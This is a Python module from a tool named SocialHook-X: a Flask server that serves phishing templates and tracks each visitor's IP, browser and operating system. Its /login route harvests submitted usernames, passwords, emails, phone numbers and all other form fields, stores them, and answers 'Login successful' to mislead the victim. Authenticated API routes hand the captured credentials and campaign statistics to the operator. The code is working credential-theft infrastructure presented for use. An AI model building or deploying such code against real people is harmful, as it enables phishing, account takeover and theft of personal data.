"""
SocialHook-X Web Server Module
Flask-based credential capture and serving
"""

import logging
import time
import os
import hmac
import ipaddress
import threading
from typing import Callable, Dict, List, Optional, Set
from flask import Flask, request, jsonify
from functools import wraps

logger = logging.getLogger(__name__)

class RateLimiter:
    """Simple rate limiter for endpoints"""
    
    def __init__(
        self,
        max_requests: int = 100,
        window_seconds: int = 60,
        max_identifiers: int = 10000,
        cleanup_interval: int = 30,
    ):
        self.max_requests = max_requests
        self.window_seconds = window_seconds
        self.max_identifiers = max_identifiers
        self.cleanup_interval = cleanup_interval
        self.requests: Dict[str, List[float]] = {}
        self.last_seen: Dict[str, float] = {}
        self._last_cleanup = 0.0
        self._lock = threading.Lock()
    
    def _cleanup(self, now: float) -> None:
        if (
            now - self._last_cleanup < self.cleanup_interval
            and len(self.requests) <= self.max_identifiers
        ):
            return
        
        stale_before = now - self.window_seconds
        stale_ids = [
            identifier
            for identifier, last in self.last_seen.items()
            if last < stale_before
        ]
        for identifier in stale_ids:
            self.requests.pop(identifier, None)
            self.last_seen.pop(identifier, None)
        
        if len(self.requests) > self.max_identifiers:
            overflow = len(self.requests) - self.max_identifiers
            oldest = sorted(self.last_seen.items(), key=lambda item: item[1])[:overflow]
            for identifier, _ in oldest:
                self.requests.pop(identifier, None)
                self.last_seen.pop(identifier, None)
        
        self._last_cleanup = now
    
    def is_allowed(self, identifier: str) -> bool:
        """Check if request is allowed"""
        now = time.time()
        
        with self._lock:
            self._cleanup(now)
            history = self.requests.get(identifier, [])
            history = [
                req_time
                for req_time in history
                if now - req_time < self.window_seconds
            ]
            
            if len(history) >= self.max_requests:
                self.requests[identifier] = history
                self.last_seen[identifier] = now
                return False
            
            history.append(now)
            self.requests[identifier] = history
            self.last_seen[identifier] = now
            return True

class WebServer:
    """Flask web server for serving phishing templates"""
    
    def __init__(self, template_dir: str = "templates", port: int = 8080, api_key: str = None):
        self.app = Flask(__name__, static_folder=None)
        self.app.config['JSON_SORT_KEYS'] = False
        self.template_dir = template_dir
        self.port = port
        self.db = None
        self.credentials_callback = None
        self.visitor_callback = None
        self.rate_limiter = RateLimiter(max_requests=100, window_seconds=60)
        self.api_key = api_key or os.getenv('SHX_API_KEY', '')
        self.trusted_proxies = self._load_trusted_proxies()
        self._setup_routes()
    
    def set_database(self, db):
        """Set database instance for storing credentials"""
        self.db = db
    
    def set_callbacks(self, cred_callback: Callable = None, visitor_callback: Callable = None):
        """Set callbacks for credential and visitor events"""
        self.credentials_callback = cred_callback
        self.visitor_callback = visitor_callback
    
    def _require_api_key(self, f):
        """Decorator to require API key for protected endpoints"""
        @wraps(f)
        def decorated_function(*args, **kwargs):
            if not self.api_key:
                logger.error("Protected endpoint accessed but SHX_API_KEY is not configured")
                return jsonify({'error': 'API key not configured'}), 503
            
            provided_key = request.headers.get('X-API-Key', '')
            if not hmac.compare_digest(provided_key, self.api_key):
                logger.warning(f"Invalid API key attempt from {self._get_client_ip()}")
                return jsonify({'error': 'Invalid API key'}), 401
            return f(*args, **kwargs)
        return decorated_function
    
    @staticmethod
    def _normalize_ip(value: str) -> Optional[str]:
        """Return a normalized IP string or None."""
        if not value:
            return None
        
        candidate = value.split(',')[0].strip()
        try:
            return str(ipaddress.ip_address(candidate))
        except ValueError:
            return None
    
    def _load_trusted_proxies(self) -> Set[str]:
        """Load trusted reverse-proxy IPs from environment."""
        raw = os.getenv('SHX_TRUSTED_PROXIES', '')
        trusted: Set[str] = set()
        
        for entry in raw.split(','):
            entry = entry.strip()
            if not entry:
                continue
            normalized = self._normalize_ip(entry)
            if normalized:
                trusted.add(normalized)
        
        return trusted
    
    @staticmethod
    def _dispatch_callback(callback: Callable, *args) -> None:
        """Execute callback asynchronously so request handling stays responsive."""
        def runner():
            try:
                callback(*args)
            except Exception as e:
                logger.error(f"Callback execution failed: {e}")
        
        threading.Thread(target=runner, daemon=True).start()
    
    def _setup_routes(self):
        """Setup Flask routes"""
        
        @self.app.route('/', methods=['GET'])
        def index():
            """Serve index page"""
            try:
                # Track visitor
                self._track_visitor()
                return "Page served", 200
            except Exception as e:
                logger.error(f"Error serving index: {e}")
                return "Error", 500
        
        @self.app.route('/login', methods=['POST'])
        def login():
            """Handle login credentials"""
            try:
                # Rate limiting
                client_ip = self._get_client_ip()
                if not self.rate_limiter.is_allowed(client_ip):
                    logger.warning(f"Rate limit exceeded for {client_ip}")
                    return jsonify({'status': 'error', 'message': 'Too many requests'}), 429
                
                # Input validation
                from core.utils.validators import Validators
                data = request.get_json() or request.form.to_dict()
                
                # Sanitize inputs
                sanitize = Validators.sanitize_string
                
                cred_dict = {
                    'template': sanitize(request.args.get('template', 'unknown')),
                    'username': sanitize(data.get('username') or data.get('email') or data.get('login') or ''),
                    'password': sanitize(data.get('password') or data.get('pass') or ''),
                    'email': sanitize(data.get('email') or ''),
                    'phone': sanitize(data.get('phone') or ''),
                    'extra_data': {k: sanitize(str(v)) for k, v in data.items()},
                    'ip_address': client_ip,
                    'user_agent': sanitize(request.headers.get('User-Agent', '')),
                    'browser': self._get_browser(),
                    'os': self._get_os()
                }
                
                # Store credential
                if self.db:
                    cred_id = self.db.add_credential(cred_dict)
                    if cred_id > 0 and self.credentials_callback:
                        self._dispatch_callback(self.credentials_callback, cred_dict, cred_id)
                
                logger.info(f"Credential captured: {cred_dict.get('template')} from {client_ip}")
                
                return jsonify({'status': 'ok', 'message': 'Login successful'}), 200
            
            except Exception as e:
                logger.error(f"Error processing login: {e}")
                return jsonify({'status': 'error', 'message': 'Invalid request'}), 400
        
        @self.app.route('/api/stats', methods=['GET'])
        @self._require_api_key
        def get_stats():
            """Get campaign statistics"""
            try:
                if self.db:
                    stats = self.db.get_statistics()
                    return jsonify(stats), 200
                return jsonify({'error': 'Database not available'}), 500
            except Exception as e:
                logger.error(f"Error getting stats: {e}")
                return jsonify({'error': 'Internal server error'}), 500
        
        @self.app.route('/api/credentials', methods=['GET'])
        @self._require_api_key
        def get_credentials():
            """Get captured credentials (filtered)"""
            try:
                template = request.args.get('template')
                if self.db:
                    creds = self.db.get_credentials(template)
                    return jsonify(creds), 200
                return jsonify({'error': 'Database not available'}), 500
            except Exception as e:
                logger.error(f"Error getting credentials: {e}")
                return jsonify({'error': 'Internal server error'}), 500
        
        @self.app.errorhandler(404)
        def not_found(e):
            return jsonify({'error': 'Not found'}), 404
        
        @self.app.errorhandler(401)
        def unauthorized(e):
            return jsonify({'error': 'Unauthorized'}), 401
        
        @self.app.errorhandler(403)
        def forbidden(e):
            return jsonify({'error': 'Forbidden'}), 403
        
        @self.app.errorhandler(500)
        def server_error(e):
            logger.error(f"Server error: {e}", exc_info=True)
            return jsonify({'error': 'Internal server error'}), 500
        
        @self.app.errorhandler(429)
        def rate_limit_error(e):
            return jsonify({'error': 'Too many requests'}), 429
    
    def _track_visitor(self):
        """Track visitor information"""
        try:
            visitor_dict = {
                'template': request.args.get('template', 'unknown'),
                'ip_address': self._get_client_ip(),
                'user_agent': request.headers.get('User-Agent', ''),
                'referrer': request.referrer or 'direct',
                'geo_data': {}
            }
            
            if self.db:
                visitor_id = self.db.add_visitor(visitor_dict)
                if visitor_id > 0 and self.visitor_callback:
                    self._dispatch_callback(self.visitor_callback, visitor_dict, visitor_id)
        
        except Exception as e:
            logger.error(f"Error tracking visitor: {e}")
    
    def _get_client_ip(self) -> str:
        """Get client IP address"""
        remote_addr = self._normalize_ip(request.remote_addr or '')
        if not remote_addr:
            return 'unknown'
        
        # Only trust forwarding headers when the request comes from a trusted proxy.
        if remote_addr in self.trusted_proxies:
            cf_ip = self._normalize_ip(request.environ.get('HTTP_CF_CONNECTING_IP', ''))
            if cf_ip:
                return cf_ip
            xff_ip = self._normalize_ip(request.environ.get('HTTP_X_FORWARDED_FOR', ''))
            if xff_ip:
                return xff_ip
        
        return remote_addr
    
    def _get_browser(self) -> str:
        """Extract browser from user agent"""
        ua = request.headers.get('User-Agent', '').lower()
        
        if 'chrome' in ua and 'edg' not in ua:
            return 'Chrome'
        elif 'edge' in ua or 'edg' in ua:
            return 'Edge'
        elif 'firefox' in ua:
            return 'Firefox'
        elif 'safari' in ua and 'chrome' not in ua:
            return 'Safari'
        elif 'opera' in ua:
            return 'Opera'
        elif 'trident' in ua:
            return 'IE'
        else:
            return 'Other'
    
    def _get_os(self) -> str:
        """Extract OS from user agent"""
        ua = request.headers.get('User-Agent', '').lower()
        
        if 'windows' in ua:
            return 'Windows'
        elif 'mac' in ua or 'darwin' in ua:
            return 'macOS'
        elif 'linux' in ua:
            return 'Linux'
        elif 'iphone' in ua or 'ipad' in ua:
            return 'iOS'
        elif 'android' in ua:
            return 'Android'
        else:
            return 'Unknown'
    
    def start(self, debug: bool = False):
        """Start Flask server"""
        try:
            logger.info(f"Starting web server on port {self.port}")
            self.app.run(host='0.0.0.0', port=self.port, debug=debug, use_reloader=False)
        except Exception as e:
            logger.error(f"Error starting web server: {e}")
    
    def stop(self):
        """Stop Flask server"""
        logger.info("Stopping web server")
